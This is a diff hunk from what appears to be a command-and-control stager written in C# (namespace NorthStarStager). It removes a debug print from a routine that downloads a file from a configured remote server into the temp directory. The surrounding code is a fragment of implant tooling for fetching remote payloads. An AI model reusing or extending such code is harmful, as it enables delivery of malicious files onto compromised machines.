@@ -469,7 +469,6 @@ namespace NorthStarStager
         */
         public string _downloadFile(string argument)
         {
-            Console.WriteLine("Im here and argument is :" + argument);
             Uri myUri = new Uri(Globals.fileDownloadUri + argument);
             string fileName = Path.GetTempPath() + System.IO.Path.GetFileName(myUri.LocalPath);
             System.Net.WebClient web = new System.Net.WebClient();
